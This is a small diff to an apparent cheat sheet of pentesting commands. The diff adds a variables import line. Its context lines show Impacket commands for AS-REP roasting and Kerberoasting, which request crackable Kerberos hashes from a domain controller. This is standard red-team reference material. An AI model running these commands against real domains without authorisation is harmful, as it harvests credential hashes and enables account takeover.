@@ -8,6 +8,7 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast -users
 impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast '<domain>/<username>' 
 
 % windows, impacket, getuserspns, kerberoast, kerberoastable
+@ windows-variables
 
 # Scan for Kerberoastable users in a target domain
 impacket-GetUserSPNs -dc-ip <dc_ip> '<domain>/<user>:<password>'
